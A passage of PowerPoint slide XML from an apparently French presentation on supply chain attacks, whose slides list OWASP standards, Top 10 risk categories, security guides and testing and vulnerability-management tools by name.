                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="C6CBC2"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Inter Light" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:ea typeface="Inter Light" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>2 juin 2026</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" fontAlgn="auto" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPts val="3600"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:tabLst/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr kumimoji="0" lang="fr-FR" sz="3200" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C6CBC2"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uLnTx/>
              <a:uFillTx/>
              <a:latin typeface="Inter Light" panose="02000503000000020004" pitchFamily="2" charset="0"/>
              <a:ea typeface="Inter Light" panose="02000503000000020004" pitchFamily="2" charset="0"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" fontAlgn="auto" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPts val="3600"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:tabLst/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="3200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="31AFDE"/>
                </a:solidFill>
                <a:latin typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:ea typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Les attaques de type </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="3200" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="31AFDE"/>
                </a:solidFill>
                <a:latin typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:ea typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Supply</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="3200" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="31AFDE"/>
                </a:solidFill>
                <a:latin typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:ea typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="3200" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="31AFDE"/>
                </a:solidFill>
                <a:latin typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
                <a:ea typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>chain</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="fr-FR" sz="3200" b="0" i="1" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="31AFDE"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uLnTx/>
              <a:uFillTx/>
              <a:latin typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
              <a:ea typeface="Inter Medium" panose="02000503000000020004" pitchFamily="2" charset="0"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4148511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95DB16A6-35FE-A30B-902C-5CB6C0E3AE15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>« </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>AppSec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> » - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Open Worldwide Application Security Project</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="ZoneTexte 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BC5BDD6F-F3BA-25FF-2D8E-94CF23E3BB23}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="453201" y="811484"/>
            <a:ext cx="5242750" cy="5478423"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" b="1" dirty="0"/>
              <a:t>Standards &amp; frameworks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>ASVS, Application Security </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Verification</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> Standard</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>MASVS, Mobile Application Security </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Verification</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> Standard</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>SAMM, Software Assurance </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Maturity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> Model (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>org-level</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>maturity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>DSOMM, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>DevSecOps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Maturity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> Model</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>CycloneDX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> SBOM standard (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>now</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> ECMA-424) for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>supply</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>chain</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>SCVS, Software Component </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Verification</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> Standard</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>The Top 10 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>family</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>OWASP Top Ten (Web Application Security Risks)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>A03:2025 Software Supply Chain Failures</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>OWASP Top 10 CI/CD Security Risks</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>CICD-SEC-4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Poisoned</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t> Pipeline Execution</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>OWASP Non-Human Identities Top 10</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" b="0" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>NHI2:2025 Secret </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" b="0" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Leakage</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" b="0" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>API, K8s, Mobile, LLM, MCP…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>Guides &amp; documentation (the "how to" knowledge)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Cheat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Sheet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Series</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>, concise per-topic good-practice guides</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>WSTG, Web Security </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Testing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> Guide</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>MASTG, Mobile Application Security </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Testing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> Guide</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>API Security Project (guidance </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>beyond</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> the API Top 10)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Developer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> Guide</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Code </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Review</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> Guide</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Proactive Controls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Threat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> modeling </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>resources</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> (e.g. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Threat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> Dragon docs)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="ZoneTexte 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{730B9811-7631-25AD-C920-72A4BAF7D3AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6387276" y="1565536"/>
            <a:ext cx="5242750" cy="3970318"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" b="1" dirty="0"/>
              <a:t>Tools &amp; code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Testing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> / scanning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>ZAP (Zed Attack Proxy) web app scanner</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Amass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>attack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>-surface/asset </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>discovery</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>OWTF, Offensive Web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Testing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> Framework</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Nettacker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>automated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>recon</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>/scanning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Supply</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>chain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> / SCA</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Dependency-Check, finds vulnerable dependencies</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Dependency-Track, component/SBOM analysis platform</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Vuln</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> management &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>defense</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>DefectDojo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>, vulnerability management for DevOps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>CRS (Core Rule Set), the standard WAF/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>ModSecurity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> ruleset</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
